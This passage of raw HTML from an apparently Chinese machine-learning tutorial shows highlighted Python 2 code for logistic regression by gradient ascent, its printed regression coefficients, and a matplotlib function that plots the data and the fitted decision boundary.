id=\"crayon-5a6f3a0cef755772211832-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print dataMatrix</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mat</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">classLabels</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">transpose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#100行1列</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print 'labelMat:\\n',labelMat</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">print</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'labelMat 的形状:rowNum='</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'colNum='</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">rowNum</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">colNum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">alpha</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.001</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">maxCycles</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ones</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">colNum</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\">#3行1列</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print shape(dataMatrix)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print shape(weights)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print shape(labelMat)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">maxCycles</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">              </span><span class=\"crayon-p\">#heavy on matrix operations</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sigmoid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">dataMatrix*</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">     </span><span class=\"crayon-p\">#100行1列</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-p\">#print h</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">error</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">              </span><span class=\"crayon-p\">#vector subtraction</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">alpha *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">transpose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">error</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#3行1列</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weights</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-20\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">'__main__'</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#weights=gradAscent(dataMat,labelMat)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print 'dataMat:\\n',dataMat</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print 'labelMat:\\n',labelMat</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print </span><span class=\"crayon-v\">weights</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0040 seconds] -->\r\n<p>打印结果:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef75c234599557\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n回归系数：\r\n[[ 4.12414349]\r\n [ 0.48007329]\r\n [-0.6168482 ]]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef75c234599557-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef75c234599557-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef75c234599557-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef75c234599557-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef75c234599557-1\">回归系数：</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef75c234599557-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.12414349</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef75c234599557-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.48007329</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef75c234599557-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">0.6168482</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>为了验证我们计算的回顾系数的准确性，我们观察一下样本空间的散点图和回归系数的拟合曲线。我们以<span id=\"MathJax-Element-48-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-432\" class=\"math\"><span id=\"MathJax-Span-433\" class=\"mrow\"><span id=\"MathJax-Span-434\" class=\"mi\">z</span><span id=\"MathJax-Span-435\" class=\"mo\">(</span><span id=\"MathJax-Span-436\" class=\"msubsup\"><span id=\"MathJax-Span-437\" class=\"mi\">x</span><span id=\"MathJax-Span-438\" class=\"mn\">1</span></span><span id=\"MathJax-Span-439\" class=\"mo\">,</span><span id=\"MathJax-Span-440\" class=\"msubsup\"><span id=\"MathJax-Span-441\" class=\"mi\">x</span><span id=\"MathJax-Span-442\" class=\"mn\">2</span></span><span id=\"MathJax-Span-443\" class=\"mo\">)</span><span id=\"MathJax-Span-444\" class=\"mo\">=</span><span id=\"MathJax-Span-445\" class=\"msubsup\"><span id=\"MathJax-Span-446\" class=\"mi\">w</span><span id=\"MathJax-Span-447\" class=\"mn\">0</span></span><span id=\"MathJax-Span-448\" class=\"mo\">+</span><span id=\"MathJax-Span-449\" class=\"msubsup\"><span id=\"MathJax-Span-450\" class=\"mi\">w</span><span id=\"MathJax-Span-451\" class=\"mn\">1</span></span><span id=\"MathJax-Span-452\" class=\"msubsup\"><span id=\"MathJax-Span-453\" class=\"mi\">x</span><span id=\"MathJax-Span-454\" class=\"mn\">1</span></span><span id=\"MathJax-Span-455\" class=\"mo\">+</span><span id=\"MathJax-Span-456\" class=\"msubsup\"><span id=\"MathJax-Span-457\" class=\"mi\">w</span><span id=\"MathJax-Span-458\" class=\"mn\">2</span></span><span id=\"MathJax-Span-459\" class=\"msubsup\"><span id=\"MathJax-Span-460\" class=\"mi\">x</span><span id=\"MathJax-Span-461\" class=\"mn\">2</span></span></span></span></span>作为我们的拟合函数，在坐标系中画出它的拟合曲线。以样本空间中<span id=\"MathJax-Element-49-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-462\" class=\"math\"><span id=\"MathJax-Span-463\" class=\"mrow\"><span id=\"MathJax-Span-464\" class=\"msubsup\"><span id=\"MathJax-Span-465\" class=\"mi\">X</span><span id=\"MathJax-Span-466\" class=\"mn\">1</span></span></span></span><span class=\"MJX_Assistive_MathML\">X1</span></span>和<span id=\"MathJax-Element-50-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-467\" class=\"math\"><span id=\"MathJax-Span-468\" class=\"mrow\"><span id=\"MathJax-Span-469\" class=\"msubsup\"><span id=\"MathJax-Span-470\" class=\"mi\">X</span><span id=\"MathJax-Span-471\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">X2</span></span>的值作为横坐标和纵坐标，画出样本空间的散点。代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef762287878368\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef plotBestFit(weights):\r\n    import matplotlib.pyplot as plt\r\n    dataMat,labelMat=loadDataSet()\r\n    dataArr = array(dataMat)\r\n    n = shape(dataArr)[0] \r\n    xcord1 = []; ycord1 = []\r\n    xcord2 = []; ycord2 = []\r\n    for i in range(n):\r\n        if int(labelMat[i])== 1:\r\n            xcord1.append(dataArr[i,1]); ycord1.append(dataArr[i,2])\r\n        else:\r\n            xcord2.append(dataArr[i,1]); ycord2.append(dataArr[i,2])\r\n    fig = plt.figure()\r\n    ax = fig.add_subplot(111)\r\n    ax.scatter(xcord1, ycord1, s=30, c='red', marker='s')\r\n    ax.scatter(xcord2, ycord2, s=30, c='green')\r\n    x = arange(-3.0, 3.0, 0.1)\r\n    y = (-weights[0]-weights[1]*x)/weights[2]\r\n    y = y.transpose()\r\n    ax.plot(x, y)\r\n    plt.xlabel('X1'); plt.ylabel('X2');\r\n    plt.show()\r\nif __name__=='__main__':\r\n    dataMat,labelMat=loadDataSet()\r\n    weights=gradAscent(dataMat,labelMat)\r\n    print '回归系数：\\n',weights\r\n    plotBestFit(weights)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef762287878368-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef762287878368-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">plotBestFit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-v\">matplotlib</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pyplot </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">plt</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataArr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataArr</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">xcord1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ycord1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">xcord2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ycord2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">xcord1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ycord1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">xcord2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ycord2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataArr</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">fig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">plt</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">figure</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef762287878368-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ax</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fig</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add_subplot</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">111</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef762287878368-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ax</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">scatter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">xcord1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ycord1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">s</span><span class=\"crayon-o\">=</span><span 